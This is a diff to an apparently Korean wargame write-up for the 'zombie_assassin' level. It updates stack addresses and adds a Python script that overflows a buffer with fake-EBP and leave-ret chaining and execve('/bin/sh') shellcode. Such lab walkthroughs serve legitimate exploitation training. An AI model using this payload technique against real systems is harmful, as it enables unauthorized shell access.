@@ -91,11 +91,11 @@ payload 시나리오 :
 
 
 
-&[buf-4] : 0xbffffaac
+&[buf-4] : 0xbffffc60 - 0x4 : 0xbffffc5c
 
-&leave-ret : 0x08048311
+&[buf+4] : 0xbffffc60 + 0x4 : 0xbffffc64
 
-&[buf+4] : 0xbffffab4
+&leave-ret : 0x080484df
 
 
 
@@ -114,7 +114,40 @@ payload 시나리오 :
 ##### Payload
 
 ```
-./zombie_assassin `python -c 'print "\xb4\xfa\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*12+"\xac\xfa\xff\xbf"+"\x11\x83\x04\x08"'`
+./zombie_assassin `python -c 'print "\x64\xfc\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*12+"\x5c\xfc\xff\xbf"+"\xdf\x84\x04\x08"'`
+```
+
+
+
+##### python
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/assassin/zombie_assassin"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+buffer_addr = 0xbffffc60
+shellcode_addr = buffer_addr + 4
+fake_ebp = buffer_addr - 4
+leave_ret = 0x080484df
+
+payload = p32(shellcode_addr)
+payload = append(shellcode)
+payload = append("\x90"*(40-4-24))
+payload = append(p32(fake_ebp))
+payload = append(p32(leave_ret))
+
+pid = os.fork()
+if pid == 0:
+        os.execv(target, ("", payload))
+else:
+        os.waitpid(pid, 0)
 ```
 
 
